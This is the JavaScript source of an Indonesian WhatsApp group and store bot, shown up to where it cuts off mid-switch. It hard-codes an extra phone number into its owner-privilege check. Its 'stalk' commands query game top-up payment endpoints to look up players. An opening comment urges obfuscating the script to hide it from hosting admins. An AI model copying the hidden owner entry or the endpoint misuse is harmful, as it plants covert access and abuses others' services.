//jika anda menginstal bot ini via panel, 
//saya harap agar script nya di enc agar 
//aman dari admin panel dan jika di upload ke github
//jgn lupa emc dulu 👌🤙
require('./owner-dan-menu')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const { uploadFile } = require('cloudku-uploader');
 const { Buffer } = require('buffer');
const axios = require('axios');
const moment = require('moment-timezone');
const ms = toMs = require('ms');
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const fetch = require('node-fetch')
let set_bot = JSON.parse(fs.readFileSync('./database/set_bot.json'));
const { smsg, fetchJson, getBuffer } = require('./lib/simple')
const { 
  isSetBot,
    addSetBot,
    removeSetBot,
    changeSetBot,
    getTextSetBot,
  updateResponList,
  delResponList,
  renameList,
  isAlreadyResponListGroup,
  sendResponList,
  isAlreadyResponList,
  getDataResponList,
  addResponList,
  isSetClose,
    addSetClose,
    removeSetClose,
    changeSetClose,
    getTextSetClose,
    isSetDone,
    addSetDone,
    removeSetDone,
    changeSetDone,
    getTextSetDone,
    isSetLeft,
    addSetLeft,
    removeSetLeft,
    changeSetLeft,
    getTextSetLeft,
    isSetOpen,
    addSetOpen,
    removeSetOpen,
    changeSetOpen,
    getTextSetOpen,
    isSetProses,
    addSetProses,
    removeSetProses,
    changeSetProses,
    getTextSetProses,
    isSetWelcome,
    addSetWelcome,
    removeSetWelcome,
    changeSetWelcome,
    getTextSetWelcome,
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    expiredCheck,
    checkSewaGroup,
    addPay,
    updatePay
} = require("./lib/store")
const { TelegraPh,catbox,uploadBufferToTelegraph,kucingBox: toUrl } = require('./lib/upload.js')

async function getGroupAdmins(participants){
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}



function runtime(seconds) {

	seconds = Number(seconds);

	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
function msToDate(mse) {
               temp = mse
               days = Math.floor(mse / (24 * 60 * 60 * 1000));
               daysms = mse % (24 * 60 * 60 * 1000);
               hours = Math.floor((daysms) / (60 * 60 * 1000));
               hoursms = mse % (60 * 60 * 1000);
               minutes = Math.floor((hoursms) / (60 * 1000));
               minutesms = mse % (60 * 1000);
               sec = Math.floor((minutesms) / (1000));
               return days + " Days " + hours + " Hours " + minutes + " Minutes";
            }
            
const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

async function UploadDulu(medianya, options = {}) {
const { ext } = await fromBuffer(medianya) || options.ext
        var form = new FormData()
        form.append('file', medianya, 'tmp.'+ext)
        let jsonnya = await fetch('https://tenaja.zeeoneofc.repl.co/upload', {
                method: 'POST',
                body: form
        })
        .then((response) => response.json())
        return jsonnya
}

const tanggal = (numer) => {
	myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
				myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu']; 
				var tgl = new Date(numer);
				var day = tgl.getDate()
				bulan = tgl.getMonth()
				var thisDay = tgl.getDay(),
				thisDay = myDays[thisDay];
				var yy = tgl.getYear()
				var year = (yy < 1000) ? yy + 1900 : yy; 
				const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				
				return`${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

module.exports = alpha = async (alpha, m, chatUpdate, store, opengc, setpay, antilink, antiwame, antilink2, antiwame2, set_welcome_db, set_left_db, set_proses, set_done, set_open, set_close, sewa, _welcome, _left, db_respon_list) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' //omzee
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await alpha.decodeJid(alpha.user.id)
        const isCreator = ["62887435047326@s.whatsapp.net",botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const groupMetadata = m.isGroup ? await alpha.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
      	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
      	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
      	const isSewa = checkSewaGroup(m.chat, sewa)
        const isAntiLink = antilink.includes(m.chat) ? true : false
        const isAntiWame = antiwame.includes(m.chat) ? true : false  
        const isAntiLink2 = antilink2.includes(m.chat) ? true : false
        const isAntiWame2 = antiwame2.includes(m.chat) ? true : false  
const isWelcome = _welcome.includes(m.chat)
const isLeft = _left.includes(m.chat)
const jam = moment().format("HH:mm:ss z")
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')

const reply = (text) =>{
  m.reply(text)
}
async function getGcName(groupID) {
            try {
                let data_name = await alpha.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }
        if (m.message) {
            alpha.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ CMD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Chat Pribadi', m.chat))
        }
if(m.isGroup){
    expiredCheck(alpha, sewa)
    }
        
      if (isAntiLink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`*「 ANTI LINK 」*\n\nLink grup detected, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Upsss... gajadi, bot bukan admin`)
        let gclink = (`https://chat.whatsapp.com/`+await alpha.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Upsss... gak jadi, untung link gc sendiri`)
        if (isAdmins) return m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
await alpha.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })
        alpha.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
      if (isAntiLink2) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return //m.reply(`Upsss... gajadi, bot bukan admin`)
        let gclink = (`https://chat.whatsapp.com/`+await alpha.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return //m.reply(`Upsss... gak jadi, untung link gc sendiri`)
        if (isAdmins) return //m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
await alpha.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })
        }
        }
      if (isAntiWame) {
        if (budy.match(`wa.me/`)) {
        m.reply(`*「 ANTI WA ME 」*\n\nWa Me detected, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Upsss... gajadi, bot bukan admin`)
        if (isAdmins) return m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
await alpha.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })        
        alpha.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
      if (isAntiWame2) {
        if (budy.match(`wa.me/`)) {
        if (!isBotAdmins) return //m.reply(`Upsss... gajadi, bot bukan admin`)
        if (isAdmins) return //m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
await alpha.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })        
        }
        }
      if (isAntiWame) {
        if (budy.includes((`Wa.me/`) || (`Wa.me/`))) {
        m.reply(`*「 ANTI WA ME 」*\n\nWa Me detected, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Upsss... gajadi, bot bukan admin`)
        if (isAdmins) return m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        alpha.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
        if (isAlreadyResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list)) {
            var get_data_respon = getDataResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list)
            if (get_data_respon.isImage === false) {
                alpha.sendMessage(m.chat, { text: sendResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list) }, {
                    quoted: m
                })
            } else {
                alpha.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
                    quoted: m
                })
            }
        }
        // Uploader
  
     
        const fakeUserAgent = require('fake-useragent');
   
        
        async function catboxUploader(media, ext = null) {
            return new Promise(async (resolve, reject) => {
                try {
                    let fileBuffer;
        
                    // Jika media berupa path file, baca sebagai buffer
                    if (typeof media === 'string' && fs.existsSync(media)) {
                        fileBuffer = fs.readFileSync(media);
                    } else if (Buffer.isBuffer(media)) {
                        fileBuffer = media;
                    } else {
                        return reject('Media harus berupa buffer atau path file yang valid.');
                    }
        
                    // Tentukan ekstensi jika tidak diberikan
                    if (!ext) {
                        const fileType = await fromBuffer(fileBuffer);
                        ext = fileType ? fileType.ext : 'jpg'; // Default jpg jika tidak terdeteksi
                    }
        
                    const formData = new FormData();
                    formData.append("fileToUpload", fileBuffer, `file.${ext}`);
                    formData.append("reqtype", "fileupload");
        
                    const responseUpload = await fetch("https://catbox.moe/user/api.php", {
                        method: "POST",
                        body: formData,
                        headers: { "User-Agent": fakeUserAgent() },
                    });
        
                    const mediaUrl = await responseUpload.text();
                    if (!responseUpload.ok || !mediaUrl.startsWith("https://")) return reject('Gagal upload ke Catbox');
                    
                    resolve(mediaUrl);
                } catch (e) {
                    console.log(e);
                    reject(e.message || e);
                }
            });
        }
        
        // Contoh penggunaan:
        // Upload dari buffer
        // const buffer = fs.readFileSync('foto.jpg');
        // catboxUploader(buffer).then(console.log).catch(console.error);
        
        // Upload dari file langsung
        // catboxUploader('foto.jpg').then(console.log).catch(console.error);
        
        switch(command) {
         case 'owner':
         case 'creator': {
            alpha.sendContact(m.chat, global.owner, m)
         }
         break
          case 'menu': case 'help':{
            alpha.sendMessage(m.chat, {image: pp_bot, caption: require("./owner-dan-menu").helpMenu(pushname)}, {quoted:m})
          }
          break
        
		case 'list': case 'store':{
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup((m.isGroup ? m.chat: botNumber), db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group/chat ini`)
            if(m.isGroup){
            let teks = `🕛 Jam : ${time}\nGroup : *${groupMetadata.subject}*\n\nHalo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
            for (let i of db_respon_list) {
              if (i.id === (m.isGroup ? m.chat : botNumber)) {
               teks += `- ${i.key.toUpperCase()}\n`
              }
            }
              teks += `\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
              alpha.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m})
            } else {
            var arr_rows = [];
            for (let x of db_respon_list) {
               if (x.id === (m.isGroup ? m.chat : botNumber)) {
                  arr_rows.push({
                     title: x.key,
                     rowId: x.key
                  })
               }
            }
            var listMsg = {
               text: `Halo @${m.sender.split("@")[0]} 👋\n\nSilahkan pilih item yang kamu butuhkan 🌟`,
               buttonText: 'Click Here',
               footer: footer_text,
               mentions: [m.sender],
               sections: [{
                  title: groupName,
                  rows: arr_rows
               }]
            }
            alpha.sendMessage(m.chat, listMsg, {
               quoted: m
            })
            }
			}
            break
			case 'dellist':{
	       // if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
            if (!isAlreadyResponList((m.isGroup? m.chat: botNumber), q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key *${q}* tidak ada di database!`)
            delResponList((m.isGroup? m.chat: botNumber), q.toLowerCase(), db_respon_list)
            reply(`Sukses delete list message dengan key *${q}*`)
			}
            break
case 'ffid': case 'freefirestalk': case 'ffstalk': {
            if (!text) return reply(`Contoh penggunaan:\n${prefix + command} user id\n\nEx.\n${prefix + command} 7424606065`)
async function ffstalk(userId) {
  let data = {
    "voucherPricePoint.id": 8050,
    "voucherPricePoint.price": "",
    "voucherPricePoint.variablePrice": "",
    "email": "",
    "n": "",
    "userVariablePrice": "",
    "order.data.profile": "",
    "user.userId": userId,
    "voucherTypeName": "FREEFIRE",
    "affiliateTrackingId": "",
    "impactClickId": "",
    "checkoutId": "",
    "tmwAccessToken": "",
    "shopLang": "in_ID",
  }
  let ff = await axios({
    "headers": {
    "Content-Type": "application/json; charset\u003dutf-8"
    },
    "method": "POST",
    "url": "https://order.codashop.com/id/initPayment.action",
    "data": data
  })
  return {
    id: userId,
    nickname: ff.data["confirmationFields"]["roles"][0]["role"]
  }
}

var { id , nickname } = await ffstalk(args[0]).catch(async _ => await reply("User tidak di temukan"))
var vf = `*FREE FIRE STALK*

*ID: ${args[0]}*
*Nickname: ${nickname ? nickname : "Zeeoneofc"}*`
reply(vf)
         }
         break
         case 'mlid': case 'mobilelegendsstalk': case 'mlstalk': {
            if (!text) return reply(`Contoh penggunaan:\n${prefix + command} id|zona id\n\nEx.\n${prefix + command} 157228049|2241`)
 async function mlstalk(id, zoneId) {
    return new Promise(async (resolve, reject) => {
      axios
        .post(
          'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
          new URLSearchParams(
            Object.entries({
              productId: '1',
              itemId: '2',
              catalogId: '57',
              paymentId: '352',
              gameId: id,
              zoneId: zoneId,
              product_ref: 'REG',
              product_ref_denom: 'AE',
            })
          ),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              Referer: 'https://www.duniagames.co.id/',
              Accept: 'application/json',
            },
          }
        )
        .then((response) => {
          resolve(response.data.data.gameDetail)
        })
        .catch((err) => {
          reject(err)
        })
    })
}

var { userName } = await mlstalk(text.split('|')[0], text.split('|')[1]).catch(async _ => await reply("User tidak di temukan"))
var vf = `*MOBILE LEGENDS STALK*

*ID: ${text.split('|')[0]}*
*ZONA ID: ${text.split('|')[1]}*
*Username: ${userName ? userName : "Zeeoneofc"}*`
reply(vf)
         }
         break
        
         
         case 'tourl': {
           let conn = alpha;
           const path = require('path');
           const fs = require("fs").promises; // Menggunakan versi promise dari fs untuk async/await
           const FormData = require("form-data");
           const { fromBuffer } = require("file-type");
           const fakeUserAgent = require("fake-useragent");
           const { filesize } = require('filesize');
         
           let q = m.quoted ? m.quoted : m;
           let mime = (q.msg || q).mimetype || '';
         
           const createFormData = (content, fieldName, ext) => {
             const { mime } = fromBuffer(content) || {};
             const formData = new FormData();
             formData.append(fieldName, content, `${new Date()}.${ext}`);
             return formData;
           };
         
           const catbox = async (content) => {
             try {
               const { ext, mime } = (await fromBuffer(content)) || {};
               const formData = createFormData(content, "fileToUpload", ext);
               formData.append("reqtype", "fileupload");
               const response = await fetch("https://catbox.moe/user/api.php", {
                 method: "POST",
                 body: formData,
                 headers: {
                   "User-Agent": fakeUserAgent(),
                 },
               });
               return await response.text();
             } catch (error) {
               throw false;
             }
           };
         
           if (!mime) return conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
         
           conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
         
           // Download media sebagai buffer
           let media = await q.download();
         
           // Simpan buffer ke file sementara menggunakan fs
           const tempFilePath = path.join(__dirname, `temp-${Date.now()}.tmp`);
           await fs.writeFile(tempFilePath, media); // Menulis buffer ke file sementara
         
           // Unggah ke Catbox
           let link = await catbox(media);
           let size = await fetch(link);
           size = await size.text();
           size = await filesize(size.length);
         
           let caption = `*SUCCES UPLOAD A FILE*\n\n🔗 *L I N K :* ${link} !\n📊 *S I Z E :* ${size} Byte`;
         
           // Bagian pesan interaktif
           let msg = generateWAMessageFromContent(
             m.chat,
             {
               viewOnceMessage: {
                 message: {
                   interactiveMessage: {
                     body: { text: '' },
                     carouselMessage: {
                       cards: [
                         {
                           header: proto.Message.InteractiveMessage.Header.create({
                             ...(await prepareWAMessageMedia({ image: { url: link } }, { upload: conn.waUploadToServer })),
                             title: '',
                             subtitle: `${m.pushName}`,
                             hasMediaAttachment: false
                           }),
                           body: { text: caption },
                           nativeFlowMessage: {
                             buttons: [
                               { "name": "cta_url", "buttonParamsJson": `{"display_text":"preview media!","url":"${link}"}` },
                               { "name": "cta_copy", "buttonParamsJson": `{"display_text": "copy url!","copy_code": "${link}"}` }
                             ]
                           },
                         },
                       ],
                       messageVersion: 1,
                     },
                   },
                 },
               },
             },
             { quoted: m }
           );
         
           await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
         
           // Hapus file sementara menggunakan fs
           await fs.unlink(tempFilePath);
         }
         break;
case 'addlist': {
    try {
        const conn = alpha;
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            var args1 = q.split("|")[0].toLowerCase()
            var args2 = q.split("|")[1]
            if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${command} *key|response*\n\n_Contoh_\n\n${command} tes|apa`)
        if (isAlreadyResponList((m.isGroup ? m.chat :botNumber), args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di chat ini.`)

        conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
        if(m.isGroup){
            if (/image/.test(mime)) {
                let media = await alpha.downloadAndSaveMediaMessage(quoted,"temp");
                let mem = await catboxUploader(media,media.split('.')[0])
                        addResponList(m.chat, args1, args2, true, mem, db_respon_list)
                        reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                addResponList(m.chat, args1, args2, false, '-', db_respon_list)
                reply(`Sukses set list message dengan key : *${args1}*`)
            }
            } else {
            if (/image/.test(mime)) {
                let media = await alpha.downloadAndSaveMediaMessage(quoted,"temp");
                let mem = await catboxUploader(media,media.split('.')[0]);
                        addResponList(botNumber, args1, args2, true, mem, db_respon_list)
                        reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                addResponList(botNumber, args1, args2, false, '-', db_respon_list)
                reply(`Sukses set list message dengan key : *${args1}*`)
            }
            }
    } catch (err) {
        console.error('Error in addlist:', err);
        m.reply('Terjadi kesalahan saat menambahkan list.');
    }
}
break;


case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
                if (!text) return m.reply(`Example ${prefix + command} WhatsApp Bot`)
                await alpha.groupUpdateDescription(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply("Terjadi kesalahan"))
            }
            break
case 'promote': {
		if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote member✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
	}
	break
	case 'demote': {
		if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote admin✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
	}
	break
case "setlinkgc": case'revoke':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
            await alpha.groupRevokeInvite(m.chat)
            .then( res => {
                reply(`Sukses menyetel tautan undangan grup ini`)
            }).catch(() => reply("Terjadi kesalahan"))
}
            break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) return m.reply('Fitur Khusus Group!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
                let response = await alpha.groupInviteCode(m.chat)
                m.reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`)
            }
            break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
				if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
                if (!quoted) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                await alpha.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply("Berhasil mengganti pp group")
                }
                break
         case 'setname':
         case 'setnamegc':
         case 'setsubject': {
           if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
				if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin")
            if (!text) return reply(`Contoh ${prefix+command} bot WhatsApp`)
            await alpha.groupUpdateSubject(m.chat, text).then((res) => reply("Done")).catch((err) => reply("Terjadi kesalahan"))
         }
         break
case 'bot':{
            var bot = `Iya kak, Ada yang bisa ${namabot} bantu?\nKetik ${prefix}menu untuk menampilkan list menu`
            const getTextB = getTextSetBot((m.isGroup? m.chat: botNumber), set_bot);
            if (getTextB !== undefined) {
                var pull_pesan = (getTextB.replace('@bot', namabot).replace('@owner', namaowner).replace('@jam', time).replace('@tanggal', tanggal(new Date())))
                alpha.sendMessage(m.chat, { text: `${pull_pesan}` }, { quoted: m })
            } else {
                alpha.sendMessage(m.chat, { text: bot }, { quoted: m })
            }
}
            break
        case "updatesetbot": case 'setbot': case 'changebot':{
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_bot*\n\n_Contoh_\n\n${command} Halo saya adalah @bot\n\n@bot = nama bot\n@owner = nama owner\n@jam = jam\n@tanggal = tanggal`)
            if (isSetBot((m.isGroup? m.chat: botNumber), set_bot)) {
                changeSetBot(q, (m.isGroup? m.chat: botNumber), set_bot)
                reply(`Sukses update set bot teks!`)
            } else {
                addSetBot(q, (m.isGroup? m.chat: botNumber), set_bot)
                reply(`Sukses set teks bot!`)
            }
        }
            break
        case 'delsetbot':{
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            if (!isSetBot((m.isGroup? m.chat: botNumber), set_bot)) return reply(`Belum ada set bot di chat ini`)
            removeSetBot((m.isGroup? m.chat: botNumber), set_bot)
            reply(`Sukses delete set bot`)
        }
            break
case 'rename':
            case 'renamelist': {
              if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
                    var args1 = q.split("|")[0].toLowerCase()
                    var args2 = q.split("|")[1]
                    if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|new key*\n\n_Contoh_\n\n${prefix+command} list dm|list dm baru`)
                    if (!isAlreadyResponList((m.isGroup? m.chat: botNumber), args1, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di chat ini`)
                    renameList((m.isGroup? m.chat: botNumber), args1, args2, db_respon_list)
                    reply(`*Sukses sob*`)
            }
            break
			case 'updatelist': case 'update':{
   	    // if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            var args1 = q.split("|")[0].toLowerCase()
            var args2 = q.split("|")[1]
            if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${command} *key|response*\n\n_Contoh_\n\n${command} tes|apa`)
            if (!isAlreadyResponList((m.isGroup? m.chat: botNumber), args1, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di chat ini`)
            if (/image/.test(mime)) {
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                let mem = await TelegraPh(media)
                        updateResponList((m.isGroup? m.chat: botNumber), args1, args2, true, mem, db_respon_list)
                        reply(`Sukses update respon list dengan key *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                updateResponList((m.isGroup? m.chat: botNumber), args1, args2, false, '-', db_respon_list)
                reply(`Sukses update respon list dengan key *${args1}*`)
            }
			}
            break
case 'jeda': {
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
            if (!text) return m.reply(`kirim ${command} waktu\nContoh: ${command} 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari`)
            opengc[m.chat] = { id: m.chat, time: Date.now() + toMs(text) }
            fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
            alpha.groupSettingUpdate(m.chat, "announcement")
            .then((res) => reply(`Sukses, group akan dibuka ${text} lagi`))
            .catch((err) => reply('Error'))
            }
            break
case 'tambah':{
	if (!text.includes('+')) return m.reply(`Gunakan dengan cara ${command} *angka* + *angka*\n\n_Contoh_\n\n${command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one + nilai_two}`)}
            break
        case 'kurang':{
